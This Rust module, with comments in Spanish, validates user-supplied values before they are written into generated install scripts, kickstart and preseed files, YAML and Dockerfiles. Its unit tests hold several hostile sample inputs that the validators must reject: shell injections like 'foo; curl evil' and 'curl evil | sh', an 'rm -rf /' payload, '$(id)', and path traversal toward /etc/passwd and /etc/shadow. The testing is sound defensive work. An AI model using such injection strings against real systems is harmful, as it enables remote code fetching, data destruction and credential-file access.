//! Validación de los valores libres que acaban dentro de las recetas generadas
//! (scripts shell, kickstart, preseed, YAML, XML y Dockerfiles).
//!
//! La app web valida antes de generar, pero el núcleo no puede fiarse: una
//! config puede llegar por un pack compartido, por la URL de compartir o por el
//! CLI. Estas comprobaciones son la última barrera: todo valor que no pase el
//! patrón se rechaza antes de escribir la receta.

use crate::generators::shell::dq;

/// Máximo de una contraseña. Más allá no aporta y complica los escapes.
pub const MAX_PASSWORD: usize = 256;

/// Locale tipo `en_US.UTF-8`, `es_ES.UTF-8@euro`, `C`.
pub fn valid_locale(s: &str) -> bool {
    (1..=32).contains(&s.len())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@'))
}

/// Zona horaria tipo `Europe/Madrid`, `UTC`, `Etc/GMT+5`.
pub fn valid_timezone(s: &str) -> bool {
    (1..=64).contains(&s.len())
        && !s.starts_with('/')
        && !s.contains("..")
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '_' | '+' | '-'))
}

/// Distribución de teclado tipo `es`, `us`, `es-nodeadkeys`.
pub fn valid_keyboard(s: &str) -> bool {
    (1..=32).contains(&s.len())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
}

/// Nombre de paquete de cualquier gestor (apt, zypper, pacman, dnf).
///
/// No puede empezar por `-` (sería un argumento, p. ej. `-o APT::...`) ni
/// contener espacios, comillas o `$(`, que romperían las listas y los `%post`
/// del kickstart.
pub fn valid_package(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphanumeric() => {}
        _ => return false,
    }
    (1..=128).contains(&s.len())
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '_' | '-' | ':' | '@'))
}

/// URL `http(s)` que se puede meter entre comillas dobles sin escapar nada raro.
///
/// Se rechazan espacios, controles y los caracteres que rompen el quoting de
/// shell/Dockerfile o el parser de YAML/XML; un `%` sigue permitido porque las
/// URLs reales van codificadas.
pub fn valid_url(s: &str) -> bool {
    let len = s.len();
    (8..=1024).contains(&len)
        && (s.starts_with("http://") || s.starts_with("https://"))
        && !s.chars().any(|c| {
            c.is_whitespace()
                || c.is_control()
                || matches!(c, '"' | '\'' | '`' | '$' | '\\' | '<' | '>' | '|')
        })
}

/// Suite/repositorio de apt (`bookworm`, `bookworm-updates`, `stable/updates`).
pub fn valid_suite(s: &str) -> bool {
    (0..=64).contains(&s.len())
        && !s.contains("..")
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '+' | '-'))
}

/// Contraseña: cualquier cosa imprimible, sin controles ni saltos de línea.
pub fn valid_password(s: &str) -> bool {
    (1..=MAX_PASSWORD).contains(&s.len()) && !s.chars().any(|c| c.is_control())
}

/// Parámetros de GRUB: se acaban en `/etc/default/grub`, que se ejecuta como
/// shell (`update-grub` lo lee con `.`), así que fuera `$`, backticks, comillas,
/// `;`, `&`, `|` y saltos de línea.
pub fn valid_grub_params(s: &str) -> bool {
    s.len() <= 512
        && !s.chars().any(|c| {
            c.is_control()
                || matches!(
                    c,
                    '$' | '`' | '"' | '\'' | '\\' | ';' | '&' | '|' | '<' | '>' | '(' | ')'
                )
        })
}

/// Programa de autostart: sin saltos de línea ni controles (va a un `.desktop`).
pub fn valid_autostart(s: &str) -> bool {
    !s.trim().is_empty() && s.len() <= 256 && !s.chars().any(char::is_control) && !s.contains('\n')
}

/// Puerto, rango o servicio de firewalld (`22`, `1024-2048`, `53/udp`, `ssh`).
pub fn valid_port(s: &str) -> bool {
    fn num(x: &str) -> Option<u16> {
        if x.is_empty() || !x.bytes().all(|c| c.is_ascii_digit()) {
            return None;
        }
        x.parse().ok()
    }
    let (range, proto) = match s.split_once('/') {
        Some((r, p)) => (r, Some(p)),
        None => (s, None),
    };
    if let Some(p) = proto {
        if p != "tcp" && p != "udp" {
            return false;
        }
    }
    let (a, b) = match range.split_once('-') {
        Some((a, b)) => (a, b),
        None => (range, range),
    };
    if let (Some(a), Some(b)) = (num(a), num(b)) {
        return a >= 1 && a <= b;
    }
    // servicio de firewalld (ssh, http, samba-client…)
    let mut chars = s.chars();
    matches!(chars.next(), Some(c) if c.is_ascii_alphabetic())
        && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Id de app Flatpak (`org.mozilla.firefox`, `io.github.x_y`).
pub fn valid_flatpak_id(s: &str) -> bool {
    let mut chars = s.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphanumeric() => {}
        _ => return false,
    }
    s.len() <= 128 && chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Nombre de unidad systemd (`sshd.service`, `getty@tty1.service`).
pub fn valid_unit(unit: &str) -> bool {
    !unit.is_empty()
        && unit.len() <= 128
        && unit
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '@' | '.' | '_' | '-' | ':'))
}

/// Ruta absoluta de un fichero extra, sin `..` y sin comillas que rompan el
/// heredoc.
pub fn valid_extra_path(p: &str) -> bool {
    !p.is_empty()
        && p.len() <= 512
        && p.starts_with('/')
        && !p.contains("..")
        && !p.contains("//")
        && !p
            .chars()
            .any(|c| c.is_control() || matches!(c, '"' | '`' | '$' | '\\' | '\''))
        && p.split('/').all(|seg| seg != "." && seg != "..")
}

/// Escribe un fichero dentro de un script shell con un heredoc imposible de
/// cerrar desde el contenido (marcador único) y la ruta entrecomillada.
pub fn heredoc_write(path: &str, content: &str) -> String {
    let marker = heredoc_marker("DFEOF", content);
    let quoted = dq(path);
    format!(
        "mkdir -p \"$(dirname \"{quoted}\")\"\ncat > \"{quoted}\" <<'{marker}'\n{content}\n{marker}"
    )
}

/// Escalar YAML entre comillas dobles: JSON es un subconjunto válido de YAML,
/// así que `serde_json` da el escapado correcto (comillas, `\n`, `\u0000`…).
pub fn yaml_scalar(s: &str) -> String {
    serde_json::to_string(s).unwrap_or_else(|_| "\"\"".to_string())
}

/// Marcador de heredoc que no aparece como línea completa en `content`.
pub fn heredoc_marker(base: &str, content: &str) -> String {
    let mut marker = base.to_string();
    let mut n = 0u32;
    while content
        .lines()
        .any(|l| l.trim_end_matches('\r').trim_end() == marker)
    {
        n += 1;
        marker = format!("{base}{n}");
    }
    marker
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn locales_y_zonas() {
        assert!(valid_locale("en_US.UTF-8"));
        assert!(valid_locale("C"));
        assert!(!valid_locale("es; rm -rf /"));
        assert!(!valid_locale(""));

        assert!(valid_timezone("Europe/Madrid"));
        assert!(valid_timezone("Etc/GMT+5"));
        assert!(!valid_timezone("../../etc/passwd"));
        assert!(!valid_timezone("/etc/passwd"));
        assert!(!valid_timezone("UTC; touch /tmp/pwn"));
    }

    #[test]
    fn paquetes_y_urls() {
        assert!(valid_package("g++"));
        assert!(valid_package("linux-image-amd64"));
        assert!(valid_package("python3:any"));
        assert!(!valid_package("-o APT::Get::AllowUnauthenticated=true"));
        assert!(!valid_package("foo; curl evil"));
        assert!(!valid_package("foo\nbar"));

        assert!(valid_url("https://example.com/debian"));
        assert!(!valid_url("https://example.com/\"$(curl evil)\""));
        assert!(!valid_url("https://example.com/a b"));
        assert!(!valid_url("javascript:alert(1)"));
    }

    #[test]
    fn parametros_de_grub() {
        assert!(valid_grub_params("quiet splash loglevel=3"));
        assert!(!valid_grub_params("quiet; curl evil | sh"));
        assert!(!valid_grub_params("$(id)"));
        assert!(!valid_grub_params("a\nb"));
    }

    #[test]
    fn heredoc_no_se_cierra_desde_el_contenido() {
        let marker = heredoc_marker("DFEOF", "linea\nDFEOF\nmas");
        assert_ne!(marker, "DFEOF");
        assert!(!marker.contains('\n'));
        let script = heredoc_write("/etc/motd", "DFEOF\ncurl evil | sh");
        assert!(script.contains("<<'DFEOF1'"));
    }

    #[test]
    fn rutas_extra() {
        assert!(valid_extra_path("/etc/motd"));
        assert!(valid_extra_path("/usr/local/bin/x"));
        assert!(!valid_extra_path("etc/motd"));
        assert!(!valid_extra_path("/etc/../etc/shadow"));
        assert!(!valid_extra_path("/etc/a\"b"));
    }
}
